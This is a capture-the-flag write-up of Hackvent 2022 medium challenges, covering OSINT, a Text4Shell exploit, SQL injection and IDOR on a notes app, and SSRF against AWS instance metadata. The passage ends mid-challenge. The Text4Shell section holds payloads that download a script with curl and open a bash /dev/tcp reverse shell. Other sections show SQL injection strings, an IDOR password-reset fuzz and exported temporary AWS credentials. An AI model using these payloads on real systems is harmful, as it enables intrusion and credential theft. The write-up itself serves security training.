# Hackvent 2022 - Medium

[ctf](/tags#ctf ) [hackvent](/tags#hackvent ) [social-media](/tags#social-
media ) [osint](/tags#osint ) [ghidra](/tags#ghidra ) [virus-
total](/tags#virus-total ) [text4shell](/tags#text4shell )
[cve-2022-42889](/tags#cve-2022-42889 ) [ssti](/tags#ssti )
[tcpdump](/tags#tcpdump ) [sqli](/tags#sqli ) [postgresql](/tags#postgresql )
[burp](/tags#burp ) [burp-repeater](/tags#burp-repeater ) [idor](/tags#idor )
[aws](/tags#aws ) [imds](/tags#imds ) [aws-secretsmanager](/tags#aws-
secretsmanager ) [gtfobin](/tags#gtfobin ) [prototype-
pollution](/tags#prototype-pollution ) [xss](/tags#xss ) [reflective-
xss](/tags#reflective-xss ) [youtube](/tags#youtube )  
  
Jan 3, 2023

  * [easy](/hackvent2022/easy)
  * medium
  * [hard](/hackvent2022/hard)

![](https://0xdfimages.gitlab.io/img/hv22-med-cover.png)

The medium 2022 Hackvent challenges covered days eight through fourteen, and
included one more hidden challenge. They get a bit more into exploitation,
with SQL injection, AWS / cloud, prototype pollution, some OSINT, and a really
interesting reflective XSS attack.

## HV22.08

### Challenge

![hv22-ball08](https://0xdfimages.gitlab.io/img/hv22-ball08.png) | HV22.08 Santa's Virus  
---|---  
Categories: |  ![open_source_intelligence](../img/hv-cat-open_source_intelligence.png)OPEN_SOURCE_INTELLIGENCE   
Level: | medium  
Author: |  yuva   
  
> A user by the name of **HACKventSanta** may be spreading viruses. But Santa
> would never do that! The elves want you to find more information about this
> filthy impersonator.

![](https://0xdfimages.gitlab.io/img/37ff7417-5c2d-46bc-985c-715e6193d57a-16704614509187.jpg)

### Solution

#### Profiles

With just an image and a handle, searching around common social media sites
finds two. Hackventsanta is on Linkedin at
<https://www.linkedin.com/in/hackventsanta/>:

![image-20221207200724605](https://0xdfimages.gitlab.io/img/image-20221207200724605.png)

Under contact info, he lists this page as well as a GitHub page:

![image-20221207200750976](https://0xdfimages.gitlab.io/img/image-20221207200750976.png)

HACKventSanta is also on Instagram at
<https://www.instagram.com/hackventsanta/>:

![image-20221207200830097](https://0xdfimages.gitlab.io/img/image-20221207200830097.png)

The GitHub page is linked in the profile there as well.

#### GitHub

That GitHub profile has only one Repo:

![image-20221207200914429](https://0xdfimages.gitlab.io/img/image-20221207200914429.png)

It shows only a Zip archive, a README, and a single release:

![image-20221207200948893](https://0xdfimages.gitlab.io/img/image-20221207200948893.png)

The Zip contains an HTML file:

    
    
    <!--Simple Html with saying nothing here-->
    <!DOCTYPE html>
    <html>
    <head>
    <title>Nothing here</title>
    </head>
    <body>
    <h1>No viruses alive here 🤔 cant say anything about tags</h1>
    </body>
    </html>
    

I spent a few minutes trying some Google dorks to look for pages with that
title, or perhaps that comment, but didn’t find anything useful.

But the page does mention “tags”, which is what the latest release is called:

![image-20221207201104301](https://0xdfimages.gitlab.io/img/image-20221207201104301.png)

There’s a file named `Undetected`.

#### ELF

`Undetected` is a Linux ELF executable:

    
    
    $ file Undetected 
    Undetected: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ed87578ddf875b9911abf41472ed1b68ccc21cf4, for GNU/Linux 3.2.0, not stripped
    

Opening it in Ghidra, `main` just prints some messages:

    
    
    undefined8 main(void)
    
    {
      puts("I am innocent! ");
      puts("I am not a hacker ");
      puts("This is not a virus ");
      puts("I can only give you key which you might need: ");
      puts(" ThisIsTheKeyToReceiveTheGiftFromSanta ");
      puts("But Go ahead and check my md5, I swear I am undetected! ");
      return 0;
    }
    

#### VirusTotal

When the above mentions “checking a hash”, and “I’m undetected”, the first
thing I think of is VirusTotal.

I’ll get the hash of the file:

    
    
    $ md5sum Undetected 
    613e91815cd44501bfa9c2c30cc06097  Undetected
    

And search for it on VT, finding [this
page](https://www.virustotal.com/gui/file/4d0e17d872f1d5050ad71e0182073b55009c56e9177e6f84a039b25b402c0aef/detection):

![image-20221207201414670](https://0xdfimages.gitlab.io/img/image-20221207201414670.png)

It agrees, this is not flagged by any AV. There’s a community comment:

![image-20221207201446969](https://0xdfimages.gitlab.io/img/image-20221207201446969.png)

#### Twitter

SwissSanta2022’s [Twitter profile](https://twitter.com/SwissSanta2022) looks
promising:

![image-20221207201551240](https://0xdfimages.gitlab.io/img/image-20221207201551240.png)

There are three posts, all QRCodes. The most recent leads to a RickRoll on
YouTube. The second leads to `evilsanta.mp3` hosted
[here](https://qr1.be/H8YX). I could download it and look for clues, but the
third is a Google Drive link that asks for a password:

![image-20221207201807001](https://0xdfimages.gitlab.io/img/image-20221207201807001.png)

The binary mentioned a key, “ThisIsTheKeyToReceiveTheGiftFromSanta”, which
I’ll enter, and it opens, showing `SANTAAAAAAAA.pdf`:

![image-20221207201910232](https://0xdfimages.gitlab.io/img/image-20221207201910232.png)

The base64-encoded string at the top decodes to a flag:

    
    
    $ echo "SFYyMntIT0hPK1NBTlRBK0dJVkVTK0ZMQUdTK05PVCtWSVJVU30=" | base64 -d
    HV22{HOHO+SANTA+GIVES+FLAGS+NOT+VIRUS}
    

**Flag:`HV22{HOHO+SANTA+GIVES+FLAGS+NOT+VIRUS}`**

## HV22.09

### Challenge

![hv22-ball09](https://0xdfimages.gitlab.io/img/hv22-ball09.png) | HV22.09 Santa's Text  
---|---  
Categories: |  ![penetration_testing](../img/hv-cat-penetration_testing.png)PENETRATION_TESTING   
Level: | medium  
Author: |  yuva   
  
> Santa recently created some Text with a 🐚, which is said to be vulnerable
> code. Santa has put this Text in his library, putting the library in danger.
> He doesn’t know yet that this could pose a risk to his server. Can you
> backdoor the server and find all of Santa’s secrets?
>
> * * *
>
> **Important notice: The challenge runs at port 443, the site that appears
> when you click the link in the Resources. All other ports already opened are
> out of the challenge scope, do not attack them.**
>
> Remember, if you want to use a Reverse Shell, you need to connect to the
> [Hacking-Lab VPN](https://github.com/Hacking-Lab/hl2-openvpn-ost.ch)
>
> Start the website in the `Resources` panel.

There’s an docker I can spin up that presents a webpage:

![image-20221208212637059](https://0xdfimages.gitlab.io/img/image-20221208212637059.png)

### Solution

#### ROT13

Entering text into the “Search gift” field returns a new page with that text
displayed back after a ROT13 translation. If I enter “0xdf was here”, it
shows:

![image-20221208212810811](https://0xdfimages.gitlab.io/img/image-20221208212810811.png)

I’ll note the URL for this new page is `/santa/attack?search=0xdf+was+here`

#### Failures

This felts for sure like it was going to be a server-side template injection
(SSTI) bug, but nothing I tried worked, including a lot of test payloads, and
those same payloads ROT13ed.

My next thought was a command injection. There’s talk of using shell for text in the prompt, so perhaps the site is calling on the system to do something like `echo "$userinput" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`. To test this, I’ll try closing quotes, adding `;`, and adding subshells (like `$(id)` and with backticks). None of these worked.

There is also a HTML injection / cross site scripting (XSS) bug in this page.
If I take `<script>alert(1)</script>`, ROT13 to `<fpevcg>nyreg(1)</fpevcg>`,
and send that, it pops an alert:

![image-20221209112714017](https://0xdfimages.gitlab.io/img/image-20221209112714017.png)

Still, to exploit this, there would have to be some way to get this in front
of another user. Because the form sends a GET request, I could use a link for
phishing, but even then, which user, and what is worth trying to steal. The
site lacks any kind of login or cookies or admin panel that I can find.

#### Text4Shell

Text4Shell (CVE-2022-4289) is very similar to a SSTI bug, in that user
submitted text is being processed as code rather than text. Patlo Alto has a
[nice post](https://www.paloaltonetworks.com/blog/prisma-
cloud/analysis_of_cve-2022-42889_text4shell_vulnerability/) describing it in
detail. There’s also a POC available on [this
page](https://github.com/securekomodo/text4shell-poc):

    
    
    ${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/itworked')}
    

I’ll first try:

    
    
    ${script:javascript:java.lang.Runtime.getRuntime().exec('id')}
    

Both in that form and after a ROT13, the ROT13 text just comes back on the
page. It doesn’t seem like it’s executing. But it could be executing blind,
and not showing the results.

I’ll connect to the HackLab VPN, and try another payload:

    
    
    ${script:javascript:java.lang.Runtime.getRuntime().exec('ping -c 1 10.13.0.22')}
    

On ROT13-encoding this and submitting, the text is the same:

![image-20221209115927405](https://0xdfimages.gitlab.io/img/image-20221209115927405.png)

But there’s ICMP at my `tcpdump`:

    
    
    oxdf@hacky$ sudo tcpdump -ni tun0 icmp
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
    02:10:59.225938 IP 152.96.7.3 > 10.13.0.22: ICMP echo request, id 29441, seq 0, length 64
    02:10:59.225983 IP 10.13.0.22 > 152.96.7.3: ICMP echo reply, id 29441, seq 0, length 64
    

That’s code execution.

#### Shell

Getting a reverse shell was a bit trickier than expected. These kind of
vulnerabilities are always finicky with pipes and redirects, so I’m not
surprised that a standard Bash reverse shell didn’t work.

My preferred way to get a shell is to write a quick Bash script that returns a
shell, `shell.sh`:

    
    
    #!/bin/bash
    
    bash -i >& /dev/tcp/10.13.0.22/443 0>&1
    

I’ll host that using a Python webserver, and upload it with the first command,
and execute it with the second:

    
    
    ${script:javascript:java.lang.Runtime.getRuntime().exec('curl 10.13.0.22/shell.sh -o /tmp/0xdf')}
    ${script:javascript:java.lang.Runtime.getRuntime().exec('bash /tmp/0xdf')}
    

On submitting the ROT13ed first command, there’s a connection at the
webserver:

    
    
    152.96.7.3 - - [09/Dec/2022 02:15:20] "GET /shell.sh HTTP/1.1" 200 -
    

On submitting the second, there’s a connect at my listening `nc`:

    
    
    $ nc -lnvp 443
    Listening on 0.0.0.0 443
    Connection received on 152.96.7.3 34758
    bash: cannot set terminal process group (283): Not a tty
    bash: no job control in this shell
    bash-5.1#
    

The flag is in `/SANTA/FLAG.txt`:

    
    
    bash-5.1# cat SANTA/FLAG.txt
    HV22{th!s_Text_5h€LL_Com€5_₣₹0M_SANTAA!!}
    

**Flag:`HV22{th!s_Text_5h€LL_Com€5_₣₹0M_SANTAA!!}`**

## HV22.10

### Challenge

![hv22-ball10](https://0xdfimages.gitlab.io/img/hv22-ball10.png) | HV22.10 Notme  
---|---  
Categories: |  ![web_security](../img/hv-cat-web_security.png)WEB_SECURITY   
Level: | medium  
Author: |  HaCk0   
  
> Santa brings you another free gift! We are happy to announce a free note
> taking webapp for everybody. No account name restriction, no filtering, no
> restrictions and the most important thing: no bugs! Because it cannot be
> hacked, Santa decided to name it Notme = Not me you can hack!
>
> Or can you?

There’s a docker that returns the following page:

![image-20221210144031188](https://0xdfimages.gitlab.io/img/image-20221210144031188.png)

### Solution

#### Enumeration

I can register for the site and log in, which leads to `/notes`, and an empty
page, but with button at the top right for “My Notes”, “New”, and “Profile”.

“New” offers a form to make a note:

![image-20221210144811272](https://0xdfimages.gitlab.io/img/image-20221210144811272.png)

They show up on `/notes`:

![image-20221210144855886](https://0xdfimages.gitlab.io/img/image-20221210144855886.png)

Clicking on one offers a chance to update it:

![image-20221210144918139](https://0xdfimages.gitlab.io/img/image-20221210144918139.png)

`/profile` offers a chance to change my password or log out:

![image-20221210144941952](https://0xdfimages.gitlab.io/img/image-20221210144941952.png)

#### Via SQL Injection

There’s an SQL injection in the `/api/note/update` endpoint that is contacted
via AJAX when I update a note. A benign request to this looks like:

    
    
    POST /api/note/update HTTP/2
    Host: 497cc3d7-1f89-416a-9a5b-8e799e92a3fe.idocker.vuln.land
    Cookie: connect.sid=s%3ADxPx5X4v-01AjW33bF_5TTGLk347Xmk1.xe9sRyzmBLaRXQmGxaI22eozyvmc6f8ZBWdekDz%2F9ac
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: application/json
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://497cc3d7-1f89-416a-9a5b-8e799e92a3fe.idocker.vuln.land/note/1
    Content-Type: application/json
    Content-Length: 153
    Origin: https://497cc3d7-1f89-416a-9a5b-8e799e92a3fe.idocker.vuln.land
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers
    
    {"id":1,"note":"new data","userId":1,"createdAt":"2022-12-10T19:17:56.740Z","updatedAt":"2022-12-10T19:17:56.740Z"}
    

The response looks like:

    
    
    HTTP/2 200 OK
    Content-Type: application/json; charset=utf-8
    Date: Sat, 10 Dec 2022 19:18:42 GMT
    Etag: W/"11-T5hvIIrIKzCvu6IzKKOWkDyp8vY"
    X-Powered-By: Express
    Content-Length: 17
    
    {"msg":"Updated"}
    

Sending this request over to Burp Repeater, I’ll notice that if I set the
`note` field to `'`, it crashes:

![image-20221210150617229](https://0xdfimages.gitlab.io/img/image-20221210150617229.png)

I can guess that the backend is doing something like:

    
    
    UPDATE notes SET note='{request.note}' WHERE id = {request.id};
    

I’ll create two notes and note their ids (from the URL for viewing them, which
is `/note/{id}`):

![image-20221210150933638](https://0xdfimages.gitlab.io/img/image-20221210150933638.png)

I’ll send this request:

    
    
    {
        "id":3,
        "note":"injected!' where id=2;-- -",
        "userId":2,
        "createdAt":"2022-12-10T19:48:15.918Z",
        "updatedAt":"2022-12-10T19:48:15.918Z"
    }
    

It reports success. If this were not injectable, it would show the new note
all the way to the semi-colon and the dashes in note 3 (replacing “second
note”). But it shows just “injected!”:

![image-20221210151208742](https://0xdfimages.gitlab.io/img/image-20221210151208742.png)

This database also allows for stacked queries. I can test that with this:

    
    
    {
        "id":3,
        "note":"note id3' where id=3; update notes set note='stacked' where id=2;-- -",
        "userId":2,"createdAt":"2022-12-10T19:48:15.918Z"
        ,"updatedAt":"2022-12-10T19:48:15.918Z"
    }
    

After submitting this, both notes are updated:

![image-20221210151550138](https://0xdfimages.gitlab.io/img/image-20221210151550138.png)

Now I have a way to get arbitrary data into one of my notes. For example, to
get the DB version, I’ll try running `version()`:

    
    
    {
        "id":3,
        "note":"note id3' where id=3; update notes set note=version() where id=2;-- -",
        "userId":2,
        "createdAt":"2022-12-10T19:48:15.918Z",
        "updatedAt":"2022-12-10T19:48:15.918Z"
    }
    

![image-20221210151703950](https://0xdfimages.gitlab.io/img/image-20221210151703950.png)

Postgres allows for [string
concatenation](https://www.postgresqltutorial.com/postgresql-string-
functions/postgresql-concat-function/) using the `||` operator. That means I
can make a much more simple query without stacking:

    
    
    {
        "id":3,
        "note":"version: ' || version() || '",
        "userId":1,
        "createdAt":"2022-12-10T20:19:12.116Z",
        "updatedAt":"2022-12-10T20:19:12.116Z"
    }
    

![image-20221210152048353](https://0xdfimages.gitlab.io/img/image-20221210152048353.png)

I can use this to read other notes. If I try to read all at once, it crashes:

![image-20221210152839258](https://0xdfimages.gitlab.io/img/image-20221210152839258.png)

But, if I filter, I can read one. For example, note with id 2 say as much:

![image-20221210152913037](https://0xdfimages.gitlab.io/img/image-20221210152913037.png)

I’ll update 3 to contain the note from 2:

    
    
    {
        "id":3,
        "note":"note: ' || (SELECT note from notes where id = 2) || '",
        "userId":1,
        "createdAt":"2022-12-10T20:19:12.116Z",
        "updatedAt":"2022-12-10T20:19:12.116Z"
    }
    

Now it matches:

![image-20221210153019777](https://0xdfimages.gitlab.io/img/image-20221210153019777.png)

If I don’t know the ID of the note I want to read, I can just use `LIMIT 1
OFFSET X` to read different notes. For example:

    
    
    {
        "id":3,
        "note":"note: ' || (SELECT note from notes LIMIT 1 OFFSET 1) || '",
        "userId":1,
        "createdAt":"2022-12-10T20:19:12.116Z",
        "updatedAt":"2022-12-10T20:19:12.116Z"
    }
    

Sets my note 3 to the note of another user I shouldn’t be able to read:

![image-20221210153303079](https://0xdfimages.gitlab.io/img/image-20221210153303079.png)

In fact, the note at `OFFSET 0` is the flag:

![image-20221210153328585](https://0xdfimages.gitlab.io/img/image-20221210153328585.png)

#### Via SQLI and Fuzzing

My original solve, instead of doing `LIMIT 1 OFFSET X`, I went looking for
note ids that I couldn’t read. I notice that there’s a different response code
for tickets that don’t exist and tickets that do but are owned by a different
user.

For demonstration, I’ll create two accounts. The one for the current cookie
has notes 1,2,3, and the other has note 4. I’ll fuzz:

    
    
    oxdf@hacky$ wfuzz -z range,1-10 -b 'connect.sid=s%3AiVsqEb-hz0ogRIwVZKrKl_OHOt66FcUt.eOYG07CqH1vh6P8SA8HC6Bze9k6ca%2FdoPMSYKkW2rR4' 'https://d5a6bcfe-fa65-44be-90cf-6e33d5a805de.idocker.vuln.land/api/note/FUZZ'
    ********************************************************
    * Wfuzz 2.4.5 - The Web Fuzzer                         *
    ********************************************************
    
    Target: https://d5a6bcfe-fa65-44be-90cf-6e33d5a805de.idocker.vuln.land/api/note/FUZZ
    Total requests: 10
    
    ===================================================================
    ID           Response   Lines    Word     Chars       Payload                                                
    ===================================================================
    
    000000007:   404        0 L      3 W      24 Ch       "7"
    000000008:   404        0 L      3 W      24 Ch       "8"
    000000009:   404        0 L      3 W      24 Ch       "9"
    000000010:   404        0 L      3 W      24 Ch       "10"
    000000001:   200        0 L      1 W      107 Ch      "1"
    000000002:   200        0 L      2 W      113 Ch      "2"
    000000003:   200        0 L      2 W      113 Ch      "3"
    000000004:   403        0 L      3 W      23 Ch       "4"
    000000005:   404        0 L      3 W      24 Ch       "5"
    000000006:   404        0 L      3 W      24 Ch       "6"
    
    Total time: 0.573179
    Processed Requests: 10
    Filtered Requests: 0
    Requests/sec.: 17.44655
    

1-3 return 200. 4 returns 403 Forbidden, and the rest return 404. So I’ll fuzz
a much bigger range, filtering 200 and 404:

    
    
    oxdf@hacky$ wfuzz -z range,1-10000 --hc 404,200 -b 'connect.sid=s%3AiVsqEb-hz0ogRIwVZKrKl_OHOt66FcUt.eOYG07CqH1vh6P8SA8HC6Bze9k6ca%2FdoPMSYKkW2rR4' 'https://d5a6bcfe-fa65-44be-90cf-6e33d5a805de.idocker.vuln.land/api/note/FUZZ'
    ********************************************************
    * Wfuzz 2.4.5 - The Web Fuzzer                         *
    ********************************************************
    
    Target: https://d5a6bcfe-fa65-44be-90cf-6e33d5a805de.idocker.vuln.land/api/note/FUZZ
    Total requests: 10000
    
    ===================================================================
    ID           Response   Lines    Word     Chars       Payload                                                
    ===================================================================
    
    000000004:   403        0 L      3 W      23 Ch       "4"
    000001337:   403        0 L      3 W      23 Ch       "1337"                                                 
    
    Total time: 111.5189
    Processed Requests: 10000
    Filtered Requests: 9998
    Requests/sec.: 89.67086
    

It finds the note at id 1337. I can read that the same way as above:

    
    
    {
        "id":3,
        "note":"flag: ' || (SELECT note from notes where id = 1337) || '",
        "userId":1,
        "createdAt":"2022-12-10T20:19:12.116Z",
        "updatedAt":"2022-12-10T20:19:12.116Z"
    }
    

Giving:

![image-20221210153906372](https://0xdfimages.gitlab.io/img/image-20221210153906372.png)

#### Via IDOR in Password Reset

I’ll note that when I update my password, it sends a POST request:

    
    
    POST /api/user/1 HTTP/2
    Host: eeb549eb-1f70-4bff-b850-672676adf861.idocker.vuln.land
    Cookie: connect.sid=s%3AdLGvo1OZyvTe3IryEFvAgobTB8YBp-vN.QRR8ZbgMppUeKXSKgQhFkKu4rT2syEnHrUCGBWawqaw
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: application/json
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://eeb549eb-1f70-4bff-b850-672676adf861.idocker.vuln.land/profile
    Content-Type: application/json
    Content-Length: 19
    Origin: https://eeb549eb-1f70-4bff-b850-672676adf861.idocker.vuln.land
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers
    
    {"password":"0xdf"}
    

The response contains what looks like the entire user object:

    
    
    HTTP/2 200 OK
    Content-Type: application/json; charset=utf-8
    Date: Sat, 10 Dec 2022 20:39:35 GMT
    Etag: W/"c4-EvNYEXZvi32QMJ22bDeU88qJJnc"
    X-Powered-By: Express
    Content-Length: 196
    
    {"id":1,"role":"user","username":"0xdf","password":"f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146","createdAt":"2022-12-10T20:18:44.281Z","updatedAt":"2022-12-10T20:18:44.281Z"}
    

I can do a similar fuzz, and note that users that exist return 200, and others
return 404:

    
    
    $ wfuzz -z range,1-5 -H 'Content-Type: application/json' -b 'connect.sid=s%3AdLGvo1OZyvTe3IryEFvAgobTB8YBp-vN.QRR8ZbgMppUeKXSKgQhFkKu4rT2syEnHrUCGBWawqaw' -d '{"password":"0xdf"}' 'https://eeb549eb-1f70-4bff-b850-672676adf861.idocker.vuln.land/api/user/FUZZ'
    ********************************************************    
    * Wfuzz 2.4.5 - The Web Fuzzer                         *    
    ********************************************************    
    
    Target: https://eeb549eb-1f70-4bff-b850-672676adf861.idocker.vuln.land/api/user/FUZZ
    Total requests: 5
    
    ===================================================================
    ID           Response   Lines    Word     Chars       Payload
    ===================================================================
    
    000000004:   404        0 L      6 W      35 Ch       "4"
    000000005:   404        0 L      6 W      35 Ch       "5"
    000000001:   200        0 L      1 W      196 Ch      "1"
    000000002:   200        0 L      1 W      193 Ch      "2"
    000000003:   404        0 L      6 W      35 Ch       "3"
    
    Total time: 0.529379
    Processed Requests: 5
    Filtered Requests: 0
    Requests/sec.: 9.445013 
    

So I can fuzz all users, and user id 1337 is real as well:

    
    
    $ wfuzz -z range,1-10000 --hc 404 -H 'Content-Type: application/json' -b 'connect.sid=s%3AdLGvo1OZyvTe3IryEFvAgobTB8YBp-vN.QRR8ZbgMppUeKXSKgQhFkKu4rT2syEnHrUCGBWawqaw' -d '{"password":"0xdf"}' 'https://eeb549eb-1f70-4bff-b850-672676adf861.idocker.vuln.land/api/user/FUZZ'
    ********************************************************
    * Wfuzz 2.4.5 - The Web Fuzzer                         *
    ********************************************************
    
    Target: https://eeb549eb-1f70-4bff-b850-672676adf861.idocker.vuln.land/api/user/FUZZ
    Total requests: 10000
    
    ===================================================================
    ID           Response   Lines    Word     Chars       Payload                                                
    ===================================================================
    
    000000001:   200        0 L      1 W      196 Ch      "1"
    000000002:   200        0 L      1 W      193 Ch      "2"
    000001337:   200        0 L      1 W      200 Ch      "1337"
    
    Total time: 112.5195
    Processed Requests: 10000
    Filtered Requests: 9997
    Requests/sec.: 88.87344
    

Not only did that find the user, it also set their password to 0xdf. But I
still don’t know the password. I’ll reset that user’s password again in Burp
Repeater and note the response:

![image-20221210155911944](https://0xdfimages.gitlab.io/img/image-20221210155911944.png)

Now I can log in as Santa and get the flag:

![image-20221210155426380](https://0xdfimages.gitlab.io/img/image-20221210155426380.png)

**Flag:`HV22{Sql1_is_An_0Ld_Cr4Ft}`**

## HV22.11

### Challenge

![hv22-ball11](https://0xdfimages.gitlab.io/img/hv22-ball11.png) | HV22.11 Santa's Screenshot Render Function  
---|---  
Categories: |  ![web_security](../img/hv-cat-web_security.png)WEB_SECURITY   
Level: | medium  
Author: |  DeathsPirate   
  
> Santa has been screenshotting NFTs all year. Now that the price has dropped,
> he has resorted to screenshotting websites. It’s impossible that this may
> pose a security risk, is it?
>
> You can find Santa’s website here:
> [https://hackvent.deathspirate.com](http://hackvent.deathspirate.com/)

The page makes a screenshot of a given URL:

![image-20221211134456679](https://0xdfimages.gitlab.io/img/image-20221211134456679.png)

If I give it my blog, it gets the top of the page:

![image-20221211134531859](https://0xdfimages.gitlab.io/img/image-20221211134531859.png)

### Solution

#### Page Analysis

The page itself has some hints on it. There’s a Powered by AWS statement /
logo at the bottom of the page. And, typically when Hackvent wants me to hack
a site, I get my own instance, not just some instance on the internet. There
must be a reason it’s in AWS.

Beyond that, it says “So Meta :D”. That’s a reference to the [AWS Instance
Metadata
Service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-
instance-metadata-service.html) (IMDS), an API which is available in EC2
instances at the IP 169.254.169.254.

Looking at the page source, the images are loaded from
`https://hackvent2022.s3.eu-west-2.amazonaws.com/`:

![image-20221211135029972](https://0xdfimages.gitlab.io/img/image-20221211135029972.png)

#### S3 Analysis

Looking at that S3 bucket, it has three files in it:

![image-20221211135412721](https://0xdfimages.gitlab.io/img/image-20221211135412721.png)

`flag1.txt` is obviously interesting. And I can access it:

    
    
    Congratulations! You've found .... oh no wait
    
    Santa told us that sometimes S3 buckets aren't so secure :/
    
    We've added an extra step to make sure the flag doesn't get breached, we split it in two and put the other half somewhere .... Secret ;)
    
    Here's the first half anyway:
    
    HV22{H0_h0_h0_H4v3_&_
    

#### Security-Credentials

I’ll use the website load (basically an SSRF) to read from the IMDS. For
example, at `http://169.254.169.254/latest/`:

![image-20221211164246373](https://0xdfimages.gitlab.io/img/image-20221211164246373.png)

At `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, I’ll
find any credentials I can use to interact with the AWS service. There’s one:

![image-20221211164406372](https://0xdfimages.gitlab.io/img/image-20221211164406372.png)

At `http://169.254.169.254/latest/meta-data/iam/security-credentials/Hackvent-
SecretReader-EC2-Role`, there’s a blob with the data for the credentials:

![image-20221211164452842](https://0xdfimages.gitlab.io/img/image-20221211164452842.png)

Getting these out is a huge pain, and less than a day into the challenge they
added it so that on this URL, the result is included in the page source:

![image-20221211164553207](https://0xdfimages.gitlab.io/img/image-20221211164553207.png)

#### Interacting with Secrets Manager

[This document from
AWS](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-
resources.html) shows how to use the temporary credentials from IMDS. Without
doing anything, I can try to read information about the S3 bucket:

    
    
    oxdf@hacky$ aws s3 ls hackvent2022
    Unable to locate credentials. You can configure credentials by running "aws configure".
    

I’ll run `aws configure`, and add in a regoin:

    
    
    oxdf@hacky$ aws configure
    AWS Access Key ID [None]: 
    AWS Secret Access Key [None]: 
    Default region name [None]: eu-west-2
    Default output format [None]: 
    

Now I’ll export the temp credentials as environment variables:

    
    
    oxdf@hacky$ export AWS_ACCESS_KEY_ID=ASIA4G76YFUNFZM5UFVS
    oxdf@hacky$ export AWS_SECRET_ACCESS_KEY=WaGRJXtrqv+hqHx9PNqfnhCj5PugCt9wz7XS03XT
    oxdf@hacky$ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEG0aCWV1LXdlc3QtMiJGMEQCIBJvz/RyCKKLhujfYZRg3/FjMU2Wmu3N3RKrqEbyIKOHAiADOndWTwyrz/vJpm+ds2tp3AU2NUuoiZN8YlGXt1Ja8SrWBAiW//////////8BEAAaDDgzOTY2MzQ5NjQ3NCIMeQxhG+dp1geR+ZGLKqoEqoXorG/L2yi92SsLtlqomlRRwhUlwsmp0AN3D9auk/5W92SPehFMRy60oezsAkJwaG5eWDbsSqnvTJ1+MMLvmcgAXyb73VJU+Er2HfZ2QhdoIbB30BtcTd7FD/Ad7wS/hPDklB9AjkDSiN+EkoQw3T4ckEGLahIRX/opidBCLPNiZBSoBgpPnosxa7q/NZFKeewEHJPgfADkEIs8h4pCHH7z87ZDn+RnyZ6iqdDtZvesvx7FXVmaAwcx48TF8nmfGx32vA4Gw0wzXD5raTKuBpOBVIxrG5te0ttJYR103cpgC2FW6vnkqVKJDIb3XWWnp18hooCDUL33/L7oe/chEh137J5JRZnEaWBFK/++5SCph0B8yu9m8i5MpOoh3sPlaBOswNTHrOvYpFZHYOACeAY8COd61iytFffJhVUL5sMxVddyWtS0+xnQ3D45II9emtvSjwSTR5TvFfCAfoabXZ6p7w+lbYGuwW4HFyv5CVS1oN1T1/VYsUEIrE7+SYyn7XUW0eiloV3X2a+xWSZlDR8V69TLF42bBFh5uMkv5PaubxXHpVfdDhfOuUnF9CxtaoWNJbzNGg894NwiE1n4ZpnnfJeQUCn4ANjK9XTLIcomFPbcRHMBHOzLkabj1pr4aTLCwgccdCDHNUg3xWMmhcx5sNglPimdkv2MYlDNiXnxGltNCY4Um+d1JEiIZlcp2vylpTyuh+X7Bdqs/S2QaENtU8c3TDitljUw5fvYnAY6qgF7udtOuXuZtQYE5eV3/OapDkkEnzt6g3Y9ijm61/vbmW8Krdmp/bdAEnMWz/6bcmnX5ohRt8CKqxDFzJ9gRZuwCgY2SpMV8tAc2/80Eq7kfdY/sT/96kWIJKlqB9EMiHGGqo7nMaGSGhp8IJHbNtWxmmfpbpZd2zd3/k9c1q3zUShg8Tf4AnjtryF3Dmd3POWE63qMwi14iRn5vbNecf2SR2+A2XPIMYkfGw==
    

Now I can read from S3:

    
    
    oxdf@hacky$ aws s3 ls hackvent2022
    2022-11-05 17:34:55      57382 3723050.png
    2022-11-06 02:48:24      10936 aws-logo-500x500.webp
    2022-11-05 17:34:56        306 flag1.txt
    

There are a ton of services that I could try to interact with them, but most
return that they are not vlaid with these creds. There’s two hints as to where
to look. First, the text from the first half of the flag says “put the other
half somewhere …. Secret ;)”. Also, the credential name is “Hackvent-
SecretReader-EC2-Role”. Both of these have to do with secrets.

Running `aws help` will show all the various services that it can interact
with. Searching in that page for secret shows an interesting one:

![image-20221211165540075](https://0xdfimages.gitlab.io/img/image-20221211165540075.png)

`aws secretsmanager help` shows there’s a `list-secrets` sub-command, and it
returns one secret:

    
    
    oxdf@hacky$ aws secretsmanager list-secrets
    {
        "SecretList": [
            {
                "ARN": "arn:aws:secretsmanager:eu-west-2:839663496474:secret:flag2-UjomOM",
                "Name": "flag2",
                "Description": "Flag for hackvent 2022",
                "LastChangedDate": 1670706291.135,
                "LastAccessedDate": 1670716800.0,
                "Tags": [],
                "SecretVersionsToStages": {
                    "3cb95787-eea6-475b-9b5b-16bac83b449d": [
                        "AWSPREVIOUS"
                    ],
                    "8a498b78-e73f-4a97-a0c3-74f365d3aa0d": [
                        "AWSCURRENT"
                    ]
                }
            }
        ]
    }
    

The `get-secret-value` sub-command requires `--secret-id`. I’ll give it the
name and it works:

    
    
    oxdf@hacky$ aws secretsmanager get-secret-value 
    usage: aws [options] <command> <subcommand> [<subcommand> ...] [parameters]
    To see help text, you can run:
    
      aws help
      aws <command> help
      aws <command> <subcommand> help
